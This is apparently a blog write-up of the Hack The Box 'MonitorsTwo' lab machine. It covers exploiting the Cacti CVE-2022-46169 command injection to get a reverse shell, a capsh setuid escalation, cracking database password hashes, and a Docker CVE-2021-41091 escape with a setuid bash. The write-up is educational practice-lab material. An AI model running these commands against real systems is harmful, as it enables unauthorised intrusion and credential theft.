---
layout: post
title: HTB MonitorsTwo Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/monitorstwo/monitorstwo.png
tags: [HTB]
---

| Name | Spooktrol |
| :--- |:--- |
| OS | Linux |
| DIFFICULTY | Easy |
## Reconnaissance
The IP address given for MonitorsTwo is 10.10.11.211. I will always start my reconnaissance with a `namp` scan. It will return me a list of listening ports on the machine to test.

The command that I ran was `nmap -p- --min-rate 1000 -sVC 10.10.11.211 -oN monitorsTwo.nmap`. This will enumerate all ports `-p-`, send the packets at an accelerated rate `--min-rate 1000`, run scrips to enumerate the service version as well as some basic enumeration `-sVC`, and save the output `-oN`. 

The results below show that there are two open ports, 22 and 80. Port 22 is running Secure Socket Shell (ssh) a protocol that allows administrators to access a machine remotely. It is generally a pretty secure protocol and does not have much of an attack surface besides brute forcing. Port 80 on the other hand is the http protocol that websites are built upon. In this setup, Nginx is the primary web server responsible for interacting with the user's browser and processing PHP scripts. Cacti, on the other hand, is an application that provides network monitoring and graphing functionality.
```
[zonifer@dell monitorsTwo]$ nmap -p- --min-rate 1000 -sVC 10.10.11.211 -oN monitorsTwo.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 19:12 MDT
Nmap scan report for 10.10.11.211
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.08 seconds
```

Browsing to the web page presents us with a login page, but more importantly, it discloses a version! Listing an application's version is generally frowned upon due to the significant security risks it poses. It can lead to targeted attacks and increased vulnerability to known exploits. 

![monitorstwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/monitorstwo/1.png)

## Exploitation 
Googling `cacti 1.2.22 exploit` shows several websites highlighting CVE-2022-46169, a command injection vulnerability for cacti 1.2.22. Rapid7 generally has good write-ups on exploits, I found [this](https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/) post that gives a good explanation of the vulnerability. 

The tl;dr of the exploit is that by setting the `X_FORWARDED_FOR_IP` to `127.0.0.1` in your request bypasses authentication. After fuzzing for valid integers in two of the parameters, `poller_id` can be injected into. 

I went ahead and wrote my own exploit for this [here](https://github.com/0xZon/CVE-2022-46169-Exploit). It will brute force the correct parameters and then inject a reverse shell payload. I set up a listener on my local machine with netcat `nc -lvnp 9001`. Then I ran the exploit against the target `python3 CVE-2022-46169.py -url http://10.10.11.211/ -lhost 10.10.14.3 -lport 9001`

The result is a shell as `www-data`
```
[zonifer@dell monitorsTwo]$ nc -lvnp 9001
Connection from 10.10.11.211:33342
whoami
www-data
```

This shell is not the greatest, and my usual python3 upgrade did not work. I ended up using a new way that I learned to get a better shell via `script`

```
script /dev/null -c bash
# ctrl + z
stty raw -echo; fg
# enter (return) x2
```

Now I have a pretty decent shell
```
www-data@50bca5e748b0:/var/www/html$ whoami
www-data
```

One thing that I noticed right off the bat was the hostname, `50bca5e748b0`. This looks like a hostname that `docker` would generate. Further looking at the root file system there is a `.dockerenv` file.
```
www-data@50bca5e748b0:/var/www/html$ ls -la /
total 84
drwxr-xr-x   1 root root 4096 Mar 21 10:49 .
drwxr-xr-x   1 root root 4096 Mar 21 10:49 ..
-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
```

## Docker Privilege Escalation 

While enumerating the system I noticed that there was an interesting binary with the `suid` set. Sometimes binaries with the `suid` set can be used to privileged escalate as the binary runs as the owner. A good way to check if a binary with the `suid` set is to reference https://gtfobins.github.io/. 

```
find / -perm /4000 2>/dev/null

www-data@50bca5e748b0:/var/www/html$ find / -perm /4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

It appears that the `/sbin/capsh` could be used to elevate our privileges to root.
![monitorstwo](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/monitorstwo/2.png)

Running `capsh --gid=0 --uid=0 --` does indeed work and elevates me to root. This is great, however, we are still in a docker container and need to escape onto the host.
```
www-data@50bca5e748b0:/tmp$ capsh --gid=0 --uid=0 --  
root@50bca5e748b0:/tmp# whoami
root
```

## Docker Pivot 

Because we got a shell as `www-data` this docker container is hosting the Cacti application. Often web applications' source code contains secrets/passwords that connect to other services, like a database. Inside the Cacti source code, I found a file called `config.php` and it contained some creds for `mysql`. These databases are always worth looking at in a real engagement as they might contain valuable information. They can still be helpful in CTF like HTB to help pivot as well. This particular connection is to another server called `db`. This might be another docker container or the host.
```php
$database_type     = 'mysql';                                    $database_default  = 'cacti';
$database_hostname = 'db';                                       $database_username = 'root';                                     $database_password = 'root';
$database_port     = '3306';                                                               
```

My command to connect to the database was `mysql -u root -p -h db cacti`. Dumping the `user_auth` table shows two usernames with hashed credentials, I cleaned up the output as it was very messy. 
```
MySQL [cacti]> select * from user_auth;
[snip]
admin $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC     marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C  
```

The next step to do after finding a hashed password is to crack it. `$2y$` is a BCrypt hash, they are generally slower to crack (as a security measure), but it still can be done. The Marcus hash did crack after some time to `funkymonkey`. I usually use `hashcat` to crack passwords but I used `john` on this machine as it does not have a GPU and `john` can take advantage of my CPU better to crack these slower hashes like bcrypt.
```
[zonifer@dell monitorsTwo]$ john hash.txt --wordlist=/opt/rockyou.txt   

[snip]

[zonifer@dell monitorsTwo]$ john hash.txt --show
?:funkymonkey
```

That credential (marcus:funkymonkey) can then be used to SSH to the machine as Marcus
```
[zonifer@dell monitorsTwo]$ ssh marcus@10.10.11.211
marcus@10.10.11.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 12 Sep 2023 03:46:16 AM UTC

  System load:                      0.0
  Usage of /:                       63.1% of 6.73GB
  Memory usage:                     12%
  Swap usage:                       0%
  Processes:                        230
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:9fa8


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ 

```

## Root

The first thing that I noticed was that Marcus has mail! It is a security notice from a sys admin, it lists 3 possible issues.
```
marcus@monitorstwo:~$ cat /var/spool/mail/marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team

```

At first glance the first CVE listed, CVE-2021-33033, shows that kernel versions before 5.11.14 are vulnerable, this machine is on version 5.4.0. However uname shows that this was built in 2023 and the CVE is for 2021. 
```
marcus@monitorstwo:~$ uname -a
Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

The XSS is not super relevant on gaining root so I'll skip it.

The last CVE is related to docker. The vulnerable versions are below 20.10.9. We are on 20.10.5, so there is a good chance that this will work.
```
marcus@monitorstwo:~$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88
```

Before this machine, I knew nothing about CVE-2021-41091, and that is pretty common on engagements. I often find CVE's that I have never exploited before. Googling and learning about a vulnerability is something that I am doing constantly. Blog posts and POCs are my preferred way to learn how an exploit works and how to perform it. I found [this](https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure) post on Google that gives a pretty good explanation. Feel free to read it in depth, but the shortened version is if we have root in a container and a user on the host we can escalate. It's done by creating a copy of `/bin/bash` and setting the the uid and gid to 0. One other option is to set the `CAP_SETUID` and `CAP_SETGID` on that same binary. Then the user on the host can execute the binary giving us a euid of 0 (root permissions). This works because `/var/lib/docker/overlay2/` has the permissions of 701, giving any user execution permission. That's a lot so let's look at it in action. 

I'll first locate the file system of the container that I have root access to. 
```
marcus@monitorstwo:~$ findmnt
[snip]
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GX
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
```

It looks like two containers are running, on my machine it was the second one. I was able to figure this out by looking at the file system and recognizing the webserver we pwnd earlier. 
```
marcus@monitorstwo:~$ ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/var/www/html
about.php                   color_templates.php         include                 README.md                                     aggregate_graphs.php        data_debug.php              index.php               remote_agent.php
aggregate_items.php         data_input.php              install                 reports_admin.php
aggregate_templates.php     data_queries.php            lib                     reports_user.php
auth_changepassword.php     data_source_profiles.php    LICENSE                 resource
```

Next, I'll copy `/bin/bash` to `/tmp/bash` and permit it to run as the owner (root). In this example, I did it via the set uid permission rather than the Linux capabilities way.
```
root@50bca5e748b0:/tmp# cp /bin/bash .
root@50bca5e748b0:/tmp# chown root:root bash
root@50bca5e748b0:/tmp# chmod 4755 bash
```

Finally, I'll run that binary back on the host with those elevated permissions.
```
marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
```

Now that I am root I can confirm the misconfiguration of the docker file system. That last x is the 1 in 701, giving anyone execution permissions. 
```
bash-5.1# ls -la /var/lib/docker/overlay2/                                                                                    
total 148                                                                                                                     
drwx-----x 37 root root 4096 Sep 12 03:18 . 
```
